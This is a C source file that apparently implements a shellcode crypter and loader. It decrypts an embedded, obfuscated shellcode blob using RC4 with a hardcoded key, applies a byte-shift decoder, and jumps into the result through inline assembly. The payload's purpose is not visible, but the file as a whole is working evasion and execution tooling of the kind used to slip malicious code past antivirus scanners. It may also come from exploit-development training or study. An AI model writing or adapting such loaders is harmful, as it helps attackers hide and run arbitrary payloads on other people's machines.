#include <stdio.h>
#include <string.h>

#define BYTE_ARRAY 256
unsigned char s[BYTE_ARRAY];
int i;
int j;

unsigned char shellcode[] = \
"\x79\x5a\x2f\x82\x7b\x32\xe4\xcb\xe9\x88\x42\xe3\x8a\xed\x8a\x42\xcc\x31\xd8\x0e\x65\x11\x9f\xb0\x96\x84\xf5\x1e\x4b\xb4\x64\x01\x1c\x6a\x4e\x47\x25\x9b\xef\xc6\xcd\x1e\xd5\x15\x2a\x64\x26\x9a\x5e\x19\x1c\xab\xc7\x5a\x6f\x65\xff";

void swap(unsigned char *one, unsigned char *two) {
	char tmp = *one;

	*one = *two;
	*two = tmp;
}

int initialize(void) {
	int x;

	for (x = 0; x < BYTE_ARRAY; x++) {
		s[x] = x;
	}

	i = j = 0;
	return 1;
}

int key_sheduling(unsigned char *key, int lenKey) {
	for (i = 0; i < BYTE_ARRAY; i++) {
		j = (j + s[i] + key[i % lenKey]) % BYTE_ARRAY;
		swap(&s[i], &s[j]);
	}

	i = j = 0;
}

char pseudo_random(void) {
	i = (i + 1) % BYTE_ARRAY;
	j = (j + s[i]) % BYTE_ARRAY;
	swap(&s[i], &s[j]);

	return s[(s[i] + s[j]) % BYTE_ARRAY];
}

void decoder(int shellcodeLenght) {
	int x;

	for(x = 0; x < shellcodeLenght; x++) {
		shellcode[x] = shellcode[x] - 10;
	}
}

void main(int argc, char **argv) {

	unsigned char key[] = "ch3rn0bylMysl4V3slUT";
	unsigned char pseudoRandomByte;
	unsigned char encryptedByte;
	int shellcodeLenght = strlen(shellcode);
	int lenKey = strlen(key);
	int count;

	initialize();
	key_sheduling(key, lenKey);
	for (count = 0; count < shellcodeLenght; count++) {

		pseudoRandomByte = pseudo_random();
		encryptedByte = shellcode[count] ^ pseudoRandomByte;
		shellcode[count] = encryptedByte;
	}
	
	decoder(shellcodeLenght);
	__asm__(
		"xor %eax, %eax\n\t"
		"xor %ebx, %ebx\n\t"
		"xor %ecx, %ecx\n\t"
		"xor %edx, %edx\n\t"

		"call shellcode"
	);
}
